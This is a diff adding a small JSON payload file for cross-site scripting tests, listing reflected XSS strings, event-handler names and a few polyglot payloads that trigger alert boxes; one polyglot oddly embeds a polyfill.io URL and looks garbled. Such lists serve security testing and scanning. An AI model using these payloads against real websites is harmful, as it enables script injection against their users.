@@ -1,0 +1,22 @@
+{
+  "reflected": [
+    "<script>alert('XSS')</script>",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg onload=alert('XSS')>",
+    "<body onload=alert('XSS')>",
+    "<input onfocus=alert('XSS') autofocus>"
+  ],
+  "event_handlers": [
+    "onerror",
+    "onload",
+    "onfocus",
+    "onmouseover",
+    "onclick",
+    "onchange"
+  ],
+  "polyglots": [
+    "'\">\">polyfill.io/v3/polyfill.min.js?unknown[except]=fetch\">alert('XSS')<!--",
+    "jaVasCript:/**/alert(String.fromCharCode(88,83,83))",
+    "<svg></svg><details open ontoggle=alert(1)>"
+  ]
+}
